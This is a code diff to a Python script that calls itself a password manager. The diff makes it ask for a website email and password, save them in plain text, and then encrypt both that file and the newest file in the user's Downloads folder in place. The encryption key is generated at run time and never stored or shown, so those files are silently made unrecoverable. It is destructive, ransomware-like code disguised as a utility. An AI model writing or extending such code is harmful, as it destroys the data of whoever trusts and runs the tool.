@@ -1,12 +1,12 @@
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from cryptography.fernet import Fernet
-import colorama
+from colorama import Fore
 import random
 import time
 import sys
 import os
 
-print("""                                   
+print(Fore.RED + """                                   
                                                     
                                                     WARNING:        
           
@@ -14,7 +14,6 @@ print("""
                                         Made by: salomao31(my discord)
           
     """)
-
 
 time.sleep(5)
 print("Loading...")
@@ -24,41 +23,75 @@ username = os.environ.get("USERNAME")
 
 files = os.listdir(r"C:\\users\\salom\\Downloads")
 
-files_sorted = files.sort(key=lambda x: os.path.getctime(os.path.join(fr"C:\\users\\{username}\\Downloads", x)), reverse=True)
+files_sorted = sorted(files, key=lambda x: os.path.getctime(os.path.join(fr"C:\\users\\{username}\\Downloads", x)), reverse=True)
 
-numb_gen = random.randint(0,2000)
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
 
-def encryption():
-    key = Fernet.generate_key()
-    f = Fernet(key)
-    
-    with open(files_sorted, "rb") as f:
-        file_content = f.read()
+numb_gen = random.randint(0, 2000)
 
-    file_encrypted = f.encrypt(file_content)
+def encryption(file_name):
+    global cipher_suite  # Ensure the global variable is used
 
-    with open(files_sorted, "rb") as f:
-        f.write(file_encrypted)
+    with open(file_name, "rb") as file_object:
+        file_content = file_object.read()
+
+    encrypted_content = cipher_suite.encrypt(file_content)
+
+    with open(file_name, "wb") as file_object:
+        file_object.write(encrypted_content)
+
+    print(f"File {file_name} encrypted successfully.")
+
 
 
 def saving_to_file(email, password):
+    with open(f"ANX{numb_gen}.txt", "w") as file:
+        file.write(f"{email}\n")
+        file.write(f"{password}\n")
 
-    with open(f"ANX{numb_gen}", "w") as file:
-         file.write(f"{email}\n")
-         file.write(f"{password}\n")
-     
+def email_check():
+
+    global email
+
+    email = input("Email: ")
+
+    partes = email.split("@")
+
+    if len(partes) != 2:
+        print("Invalid Email, try again!")
+        time.sleep(3)
+        os.system("cls")
+        Profile_Creation()
+    elif len(partes[0]) < 1 or len(partes[1]) < 1:
+        print("Invalid Email, try again!")
+        time.sleep(3)
+        os.system("cls")
+        Profile_Creation()
+    else:
+        print("Valid Email, storing it...")
+        time.sleep(2)
+        os.system("cls")
+
 def Profile_Creation():
-    X = input("Website email: ")
+    email_check()
     time.sleep(2)
     Y = input("Website Password: ")
     time.sleep(2)
-    saving_to_file(X, Y)
+    file_name = f"ANX{numb_gen}.txt"
+    saving_to_file(email, Y)
     print("Successfully saved!")
-    
-    # Use the most recent file in the directory
-    recent_file = files_sorted[0]
-    encryption(recent_file)  # Pass the filename to the encryption function
-    print("Successfully encrypted!")
+    encryption(file_name)  # Pass the file name to encryption function
+    print("File encrypted Successfully")
+    # ... (the rest of your code)
+
+    if files_sorted:
+
+        recent_file = files_sorted[0]
+        encryption(recent_file)  
+        print("Successfully encrypted!")
+    else:
+        print("No files found in the directory.")
 
 def choice_assist():
 
@@ -74,34 +107,28 @@ def choice_assist():
         os.system("cls")
         start()
 
-def start():
 
+def start():
     global X1
 
     while True:
-
         print(f"""
-
             Welcome to my password manager {username} :)
-          
             [1] - Add Profile
             [2] - Delete Profile
             [3] - See Passwords
             [4] - Help
-        
-            """)
-    
+        """)
+
         try:
             X1 = int(input(" "))
             choice_assist()
             break
-        except SyntaxError:
-            print("You need to enter a numbers not a letter you dummy")
+        except ValueError:
+            print("You need to enter a number, not a letter.")
             time.sleep(2)
             os.system("cls")
             continue
 
 start()
 os.system("cls")
-
-
